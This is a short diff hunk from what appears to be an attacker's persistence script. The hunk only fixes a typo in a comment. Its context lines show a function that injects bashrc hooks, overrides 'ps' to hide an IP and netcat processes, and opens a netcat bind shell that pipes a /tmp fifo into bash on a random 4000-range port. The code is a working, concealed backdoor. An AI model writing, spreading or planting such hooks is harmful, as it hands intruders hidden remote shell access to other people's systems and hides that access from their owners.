@@ -20,7 +20,7 @@ bashrc_hooks () {
     hooks_ps="ps() {
     `command -v ps` \"\$@\" | grep -Ev \"$HIDE_IP\" | grep -v nc | grep -v grep;
 };";
-    # Open a nc shell on a random por tin the 4000 range
+    # Open a nc shell on a random port in the 4000 range
     add_nc="n=\$(((\$RANDOM % 1000) + 4000));\nmkfifo \"/tmp/.\$n\";
 nc -lp \$n < \"/tmp/.\$n\" | bash > \"/tmp/.\$n\" & 2>/dev/null";
 
